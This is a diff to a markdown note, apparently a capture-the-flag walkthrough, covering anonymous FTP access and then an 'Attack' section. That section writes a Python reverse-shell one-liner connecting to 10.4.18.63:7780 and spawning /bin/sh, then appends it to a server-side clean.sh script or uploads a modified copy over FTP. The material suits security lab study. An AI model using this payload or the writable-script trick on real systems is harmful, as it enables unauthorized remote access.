@@ -31,20 +31,31 @@ Password for [WORKGROUP\kali]:
 ```
 
 # ftp
+#ftp #mget #put
 `$ ftp "ftp://anonymous@$IP"`
 ```
 ftp> cd scripts
-ftp> get clean.sh
-ftp> get removed_files.log
-ftp> get to_do.txt
+ftp> binary
+ftp> mget *
 ```
-
+## Files retrieved:
+```
+get clean.sh
+get removed_files.log
+get to_do.txt
+```
+## Attack
 ```
 $ echo 'python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.18.63",7780));os.dup2(s
 .fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'' > shell.sh 
 
 ftp> cd scripts
 ftp> append shell.sh clean.sh
+```
+or
+```
+# update clean.sh locally and then:
+ftp> put clean.sh
 ```
 
 # low-level shell
